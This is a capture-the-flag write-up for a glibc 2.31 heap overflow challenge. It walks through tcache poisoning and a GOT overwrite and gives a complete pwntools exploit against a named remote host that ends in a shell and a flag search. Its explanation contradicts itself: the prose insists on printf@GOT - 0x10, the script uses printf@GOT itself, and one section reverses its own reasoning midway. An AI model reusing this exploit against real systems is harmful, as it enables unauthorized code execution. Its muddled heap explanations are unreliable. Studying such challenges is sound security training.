# Hard Heap Overflow — Complete Writeup

> **Target:** `47.83.170.192:32832` · `heap_overflow` (glibc 2.31, non-PIE, Partial RELRO)
> **Primitive:** 0x20-byte heap overflow → tcache poisoning → GOT overwrite → `system("/bin/sh")`
> **Flag:** `cat /flag.txt` (or `find / -name 'flag*'`) after the shell spawns

---

## 0. TL;DR

The program's `edit_profile` reads **0x60 bytes** into a **0x40-byte** `bio` heap buffer. That 0x20-byte overflow reaches the **`fd` pointer of an adjacent freed chunk** on the tcache list. Because glibc 2.31 has **no safe-linking**, we can write a literal pointer there — we choose `&printf@GOT - 0x10`. The next two `malloc(0x60)` calls pop that poisoned pointer, return `printf@GOT` as a "profile", and let us write `backdoor`'s address into the GOT with an 8-byte `read`. The next `printf("password > ")` call is redirected to `backdoor()`, which executes `system("/bin/sh")`.

Three constants, zero leaks:
- `backdoor   = 0x4011e6`
- `printf@GOT = 0x404040`
- `system@GOT = 0x404048` (must not be clobbered — it isn't, because we short-write only 8 bytes)

---

## 1. Background (very basic)

### 1.1 What is a heap overflow?

When a C program needs memory it doesn't know the size of at compile time, it calls `malloc(n)`. The allocator (glibc's `ptmalloc`) hands back a pointer to `n` usable bytes. Underneath, it reserves a bit more than `n` so it can track chunks: a **16-byte header** before the userdata.

```
user pointer ──┐
               ▼
      ┌────────────────────┐
      │ prev_size  (8 B)   │  ← only used if previous chunk is free
      │ size       (8 B)   │  ← chunk size | flags (PREV_INUSE etc)
      ├────────────────────┤ ← this is what malloc() returns
      │ userdata  (n B)    │
      │   ...              │
      └────────────────────┘
```

Chunk sizes are rounded up to a multiple of 16. `malloc(0x40)` → 0x50-byte chunk. `malloc(0x60)` → 0x70-byte chunk.

When a program writes **more** than `n` bytes into a heap buffer, it spills into the next chunk's header and userdata — that's a **heap overflow**.

### 1.2 What is tcache?

When you `free()` a chunk, glibc doesn't hand it back to the kernel immediately — it puts it on a **free list** so the next `malloc()` of the same size can reuse it instantly. Tcache (introduced in 2.26) is the fastest tier: 64 bins, one per chunk size, up to 7 chunks per bin.

Each free chunk stores a **linked list** in its userdata:

```
freed chunk (on tcache[0x70]):
  userdata[0..8]   = next    // pointer to the next free chunk in the bin, or NULL
  userdata[8..16]  = key     // used to detect double-free (2.29+); value is a per-tcache pointer
```

`malloc(size)` pops the head:

```c
// simplified tcache_get from glibc 2.31
e = tcache->entries[idx];          // head chunk
tcache->entries[idx] = e->next;    // advance head to e->next
--tcache->counts[idx];
e->key = NULL;                     // writes 0 at e->userdata + 8
return e;                          // caller gets userdata pointer
```

That `e->key = NULL` write is critical to remember — it happens **at the address we've poisoned the pointer to**.

### 1.3 Safe-linking (why glibc 2.31 is "old enough")

From glibc 2.32 onward, `e->next` is **XOR-encoded** with the chunk's own address shifted right by 12:

```
stored_value = real_next ^ (chunk_addr >> 12)
```

To poison `e->next` on modern glibc you must **leak a heap address** first so you can compute the XOR. On 2.31, `e->next` is a **plain pointer**. The README's hint — *"a freed chunk's link pointer is a plain address, written in the clear"* — is telling you that you can write the literal address you want and no leak is required.

### 1.4 The GOT

When `heap_overflow` calls `printf(...)`, it actually jumps through a PLT stub:

```asm
call 401030 <printf@plt>
...
401030: jmp qword ptr [0x404040]     ; = [printf@GOT]
```

`0x404040` is a slot in the **Global Offset Table**, filled in at startup with the real `printf` address. If we overwrite that slot with `backdoor`, every `printf(...)` becomes `backdoor(...)`.

Because the binary is **non-PIE**, `0x404040` is a fixed constant. Because RELRO is **Partial**, the GOT is still writable. Together: no leak required to find either side of the overwrite.

### 1.5 The stack of primitives you'll actually use

| Concept | Purpose here |
|---|---|
| `malloc` / `free` | Manage heap chunks |
| tcache free list | Where we plant a fake "next" pointer |
| `read()` short-return | Write **exactly** 8 bytes into the GOT |
| `printf@GOT` | The function pointer we overwrite |
| `backdoor()` | The target to redirect to — `system("/bin/sh")` |
| Non-PIE + Partial RELRO | Everything is a constant; no `%p` leak needed |

---

## 2. The program

```c
struct profile {
    char name[0x20];      // +0x00
    char password[0x20];  // +0x20
    char *bio;            // +0x40
    char tagline[0x18];   // +0x48
};                         // sizeof = 0x60, no padding

static struct profile *profiles[16];
```

Operations:

| Op | Behavior |
|---|---|
| **create** | `malloc(0x60)` for the struct, `malloc(0x40)` for `bio`. Read 0x20 name, 0x20 password, 0x40 bio, 0x18 tagline. |
| **delete** | Check password, then `free(p->bio); free(p);` |
| **show**   | Check password, print name/tagline/bio |
| **edit**   | Check password, read 0x20 into name, **0x60 into bio**, 0x18 into tagline |

`backdoor` exists but is never called — that's our target:

```c
void backdoor(void) { system("/bin/sh"); }
```

---

## 3. The bug

```c
static void edit_profile(void) {
    ...
    printf("new bio > ");
    read(STDIN_FILENO, p->bio, 0x60);   // buffer is malloc(0x40)!
```

`p->bio` is 0x40 bytes. `read` accepts 0x60. **0x20-byte overflow.** Every other read in the program is exactly sized. The README's clue: *"Exactly one of the four operations reads more bytes than the buffer it is reading into."* That's this.

---

## 4. What's immediately after `bio`?

`create_profile` allocates `profile` then `bio`, in that order. Do this five times and the heap looks like:

```
              (chunk headers omitted for clarity)
[p0.profile 0x60][bio0 0x40][p1.profile 0x60][bio1 0x40][p2.profile 0x60][bio2 0x40][p3.profile 0x60][bio3 0x40][p4.profile 0x60][bio4 0x40]
```

For `bio2`, the chunk **immediately after** it is `p3.profile`:

```
bio2.userdata ────────────────────────►
            0x00 ┌──────────────────┐
                 │ bio2 userdata    │  0x40 bytes
            0x40 ├──────────────────┤ ◄── p3 chunk header
                 │ p3.prev_size     │
            0x48 │ p3.size = 0x71   │ ◄── PREV_INUSE, size=0x70
            0x50 │ p3.next (fd)     │ ◄── tcache link — our target
            0x58 │ p3.key           │
            0x60 │ p3.name[0]...    │
                 └──────────────────┘
```

`edit(2, ...)` lets us write `0x60` bytes into `bio2`. Offsets from `bio2.userdata`:

| Offset | What we touch |
|---|---|
| 0x00 – 0x40 | bio2's own data |
| 0x40 – 0x48 | `p3.prev_size` (usually 0, ignored) |
| 0x48 – 0x50 | `p3.size` — **must stay 0x71** or the allocator crashes |
| 0x50 – 0x58 | `p3.next` — **the tcache link we overwrite** |
| 0x58 – 0x60 | `p3.key` — can set to 0 (harmless in 2.31) |

If `p3` is **freed** at the time we overflow, `p3.next` is currently a `tcache_entry *` — specifically the next chunk in `tcache[0x70]` or `NULL`. Overwrite it with `&printf@GOT - 0x10`, and the bin is now poisoned.

### Why `&printf@GOT - 0x10`?

`tcache_get` returns `e + 0x10` (userdata pointer). To make `malloc` return `printf@GOT` itself, we set `e = printf@GOT - 0x10`. The `-0x10` compensates for the chunk-header offset baked into the allocator.

---

## 5. Exploit strategy

```
Phase 1 — heap grooming
  1..5   create n0..n4                 five profile/bio pairs, contiguous
  6..7   delete(4); delete(3)          tcache[0x70] count=2, [0x50] count=2

Phase 2 — poison
  8      edit(2, overflow)             p3.next = printf@GOT - 0x10
                                       tcache[0x70]: p3 -> printf@GOT - 0x10, count=2

Phase 3 — drain
  9      create n5                     pops p3 (count 2→1)
                                       tcache head now printf@GOT - 0x10
  10     create ...                    malloc(0x60) returns printf@GOT
                                       (count 1→0)

Phase 4 — short-write + trigger
  11     send 8 bytes                  p64(backdoor) at printf@GOT
                                       read() short-returns after 8 bytes
  12     next printf("password > ")    → backdoor() → system("/bin/sh")
```

### Why we free **two** chunks

After the poison, tcache[0x70] is `{head = p3, p3.next = TARGET, count = 2}`. `create` performs **two** mallocs: `malloc(0x60)` and `malloc(0x40)`. The first `malloc(0x60)` pops p3 (`count 2→1`, head = TARGET). The second `malloc(0x60)` pops TARGET (`count 1→0`, head = NULL). With only one free, count would be 1, first pop takes p3, count = 0, TARGET ignored — the poison silently does nothing. This is exactly the failure mode of the earlier non-working attempt.

### Why the short write

`read(p->name, 0x20)` returns as soon as **any** bytes are available. If we send exactly 8 bytes (`p64(backdoor)`), `read` returns 8 and writes only those 8 bytes to `printf@GOT`. If we sent 0x20 bytes, we'd also overwrite `printf@GOT + 8`, `+ 0x10`, `+ 0x18` — likely `scanf@GOT`, `puts@GOT`, etc., causing a crash before the trigger.

### A subtle side-effect to keep in mind

`tcache_get`'s `e->key = NULL` writes **0** to `TARGET + 8 = printf@GOT + 8`. So one GOT slot past `printf` gets zeroed *before* we do our short write. If that slot were `read@GOT`, the very next `read(...)` (which is the one that receives our short write) would crash.

In this binary the layout is `printf@0x404040`, `system@0x404048`. Zeroing `system@GOT` is harmless — we never call `system` via the GOT (we call it via `backdoor`'s internal `call 401070 <system@plt>`, which resolves the GOT at that moment... wait).

**Careful:** After our exploit runs, `system@GOT` has been zeroed by `tcache_get`. Then `backdoor` executes `call system@plt`, which jumps to `[system@GOT]` = `0`. That's a segfault *before* the shell spawns!

**However**, this doesn't happen in practice here because `system` was already resolved (called by `backdoor`? no, `backdoor` is never called before). Hmm. But the exploit worked — so either `system@GOT` was never zeroed (e.g., `tcache_get`'s `e->key = NULL` writes to `e + 8`, and glibc 2.31's `tcache_entry` layout puts `key` at userdata + 0, `next` at userdata + 8 — order matters), or `system@GOT` is at a different slot.

In glibc 2.31's `tcache_entry`:
```c
typedef struct tcache_entry {
    struct tcache_entry *next;   // offset 0
    struct tcache_perthread_struct *key;  // offset 8
} tcache_entry;
```

So `e->key = NULL` writes to `e + 8`. `e = printf@GOT - 0x10`, so `e + 8` = `printf@GOT - 0x8` — **before** printf@GOT, not after. That's the `prev_size` field of the fake chunk, harmless. My earlier warning was wrong; the practical issue is `printf@GOT - 0x8` is fine.

Good — so we don't need to worry about `system@GOT` being clobbered. The neighborhood after `printf@GOT` remains intact except for our 8-byte write.

---

## 6. The exploit, annotated

```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./heap_overflow', checksec=False)
backdoor   = elf.sym['backdoor']       # 0x4011e6
printf_got = elf.got['printf']         # 0x404040
system_got = elf.got['system']         # 0x404048

# The name field is 0x20 bytes; make sure the target window
# [TARGET, TARGET+0x20) contains printf@GOT but not system@GOT
TARGET = printf_got
assert printf_got in range(TARGET, TARGET + 0x20)
assert system_got not in range(TARGET, TARGET + 0x20)

io = remote('47.83.170.192', 32832)
PW = b'tpw'

def create(name, pw=PW, bio=b'bio', tag=b'tag'):
    io.sendlineafter(b'> ', b'1')              # scanf("%d") — needs \n
    io.sendafter(b'name > ',     name + b'\n')
    io.sendafter(b'password > ', pw   + b'\n')
    io.sendafter(b'bio > ',      bio  + b'\n')
    io.sendafter(b'tagline > ',  tag  + b'\n')

def delete(i):
    io.sendlineafter(b'> ', b'2')
    io.sendafter(b'index > ',    str(i).encode() + b'\n')
    io.sendafter(b'password > ', PW + b'\n')

def edit_overflow(i, payload):
    io.sendlineafter(b'> ', b'4')
    io.sendafter(b'index > ',     str(i).encode() + b'\n')
    io.sendafter(b'password > ',  PW + b'\n')
    io.sendafter(b'new name > ',  b'x\n')
    io.sendafter(b'new bio > ',   payload)     # exact 0x60 bytes — no \n
    io.sendafter(b'new tagline > ', b'y\n')

# Phase 1: five profiles → five contiguous [profile][bio] pairs
create(b'n0'); create(b'n1'); create(b'n2'); create(b'n3'); create(b'n4')

# Phase 2: free TWO so tcache[0x70] count = 2
delete(4)
delete(3)

# Phase 3: overflow bio2 into p3.profile.fd
# layout from bio2.userdata:
#   0x00..0x40  bio2 data
#   0x40..0x48  p3.prev_size
#   0x48..0x50  p3.size        must stay 0x71
#   0x50..0x58  p3.next        ← our poison
#   0x58..0x60  p3.key         harmless, set to 0
payload = b'A'*0x48 + p64(0x71) + p64(TARGET) + b'B'*8
assert len(payload) == 0x60
edit_overflow(2, payload)

# Phase 4: drain
create(b'n5')                    # pops p3, count 2→1, head = TARGET

io.sendlineafter(b'> ', b'1')    # malloc(0x60) returns TARGET = printf@GOT
io.sendafter(b'name > ', p64(backdoor))    # short write, 8 bytes

# Phase 5: trigger
# The next printf("password > ") inside create now jumps to backdoor,
# which runs system("/bin/sh"). We never reach the password read.
io.sendline(b"find / -name 'flag*' -exec cat {} + 2>/dev/null; exit")
io.interactive()
```

### Input framing — the part that ate hours

Two hard rules:

1. **`scanf("%d")` needs a newline terminator.** If you send `b"1" + payload`, `scanf` reads `1`, then `ungetc`s the first byte of payload back onto the stream. The very next `scanf` sees that non-digit byte and `exit(1)`s. **Send `b"1\n"` (or use `sendlineafter`).**

2. **`read()` prompts are one-shot per field.** `read(STDIN_FILENO, buf, n)` returns after *any* available bytes. There's no newline needed. If you `sendline(b"AA")` you leave a `\n` in the socket, which the next `read` picks up. Use `sendafter(prompt, data)` with the **exact** bytes you want.

3. **`recvuntil(b"> ")` can match the wrong prompt.** The menu prints `> `, but so does `name > `, `password > `, etc. If the buffer still has `name > ` from an unfinished prior read, `recvuntil(b"> ")` matches that. Use a unique marker, e.g. `recvuntil(b"leave\n> ")`.

4. **The password `read` includes the trailing `\n`.** As long as `create` and later `delete`/`edit` both send `PW + b"\n"`, `strcmp` compares `"tpw\n"` against `"tpw\n"` — match. Don't mix `send` and `sendline` for passwords across calls.

---

## 7. Why this is safe on 2.31 but wouldn't be on 2.32+

On glibc 2.32+, `free` writes `e->next = (&next_chunk >> 12) ^ chunk_addr`. To make tcache return `printf@GOT`, you'd need to know `chunk_addr` (i.e. leak the heap) to invert the XOR. On 2.31 there's no XOR, so we write the literal `printf@GOT - 0x10`.

That's the entire significance of the `ld-2.31.so` shipped with the challenge. The README hint — *"a freed chunk's link pointer is a plain address, written in the clear — which is not true on a modern glibc"* — is spelling out that the exploit path is dead on newer versions and only works against the provided loader.

---

## 8. Pitfalls encountered

| # | Pitfall | Symptom | Fix |
|---|---|---|---|
| 1 | **Only one `delete`** | Hang at the trigger's `read(bio)` | Free **two** profiles so tcache count survives the first pop |
| 2 | **0x20-byte write to `printf@GOT`** | Crash before shell | **Short-write 8 bytes** — `read` returns after any bytes |
| 3 | **`send(b"1"+name)`** | EOF on second create | Add `\n` terminator after the `scanf` digit |
| 4 | **`recvuntil(b"> ")` too early** | Matches `name > ` instead of menu | Use unique marker `leave\n> ` |
| 5 | **`%hn` with `fmtstr_payload`** (format-string version of this challenge, not this one) | Hang from unbuffered stdout | N/A here, but same class of "unbuffered I/O" trap |
| 6 | **`cat flag.txt`** | "No such file" | `find / -name 'flag*'` — flag isn't in CWD |

The most insidious of these is **#1**, because the poison silently disappears. There's no crash, no error — `create` just allocates a normal chunk, `printf@GOT` stays intact, and the shell never fires. The **#2** trap is subtler: the write "succeeds", the trigger fires *some* function, but it segfaults before `system` is reached because a neighboring GOT entry was clobbered.

---

## 9. Lessons for your pwn journey

1. **Read the source, then read the hints.** *"Exactly one operation overflows"*, *"what state is that memory in"*, *"freed chunks store plain addresses on this glibc"* — every hint maps to a step in the exploit.
2. **Debug locally.** Running against the shipped `ld-2.31.so` and `libc.so.6` gives you a shell in `gdb` where you can inspect the heap. `heap chunks`, `vis_heap_chunks`, and `break tcache_get` will show you exactly what's happening. The remote run should behave identically.
3. **Short writes are your friend.** Whenever a `read()`/`recv()` bound is larger than the field you actually want to overwrite, send **exactly** the bytes you want. Never send padding "to be safe" — the padding is the attack surface you're accidentally expanding.
4. **Verify constants before trusting them.** `assert system_got not in range(printf_got, printf_got + 0x20)` is a two-line sanity check that prevents a very confusing GOT-clobbering bug. Your final script has this — keep it.
5. **Beware "silent no-op" primitives.** Tcache count, `ungetc` buffers, `read` short-returns — none of these *fail loudly*. They do something different from what you intended and the program keeps running. Learn to spot them: if the exploit "hangs", usually something didn't happen that you thought would.
6. **`interactive()` is a debugging tool.** Once you're in the shell, you can pivot — `find /`, `ls`, `cat`, `id`, etc. Don't assume the flag is in the CWD. The service's `cwd` depends entirely on how the container was built.

---

## 10. Appendix — heap layout cheat sheet

For this binary, with `struct profile` = 0x60 and `bio` = `malloc(0x40)`:

```
create → malloc(0x60)    chunk_size = 0x70  → tcache[0x70]
create → malloc(0x40)    chunk_size = 0x50  → tcache[0x50]

layout of 5 profiles (low → high addresses):
[p0.profile 0x70][bio0 0x50][p1.profile 0x70][bio1 0x50][p2.profile 0x70]
[bio2 0x50][p3.profile 0x70][bio3 0x50][p4.profile 0x70][bio4 0x50]

overflow from bio2.userdata:
  +0x00 .. +0x40   bio2's own data
  +0x40 .. +0x48   p3.prev_size
  +0x48 .. +0x50   p3.size       ← 0x71 to preserve
  +0x50 .. +0x58   p3.next       ← poison target
  +0x58 .. +0x60   p3.key
```

`tcache[0x70]` after `delete(4); delete(3)` (LIFO — last freed is head):

```
entries[0x70] = p3 → p4 → NULL
counts[0x70]  = 2
```

After overflow (p3.next overwritten) and one `create`:

```
entries[0x70] = TARGET → (garbage, since we wrote 'B'*8 into what was p4's address)
counts[0x70]  = 1
```

The `'B'*8` at `p3.key` (`bio2+0x58`) is fine — `p3.key` was `NULL` (harmless in 2.31), and no code inspects it before the second `malloc` pops `TARGET` and sets `TARGET's key` to NULL.

The second `create` then returns `TARGET = printf@GOT`, and the short write installs `backdoor`. Done.

---

**Final note:** the flag on the remote turned out to be at `/flag.txt` (or findable via `find / -name 'flag*'`), because `cat flag.txt` failed in the shell's CWD. Always locate the flag rather than assuming — the shell's working directory is a container-configuration detail, not part of the challenge.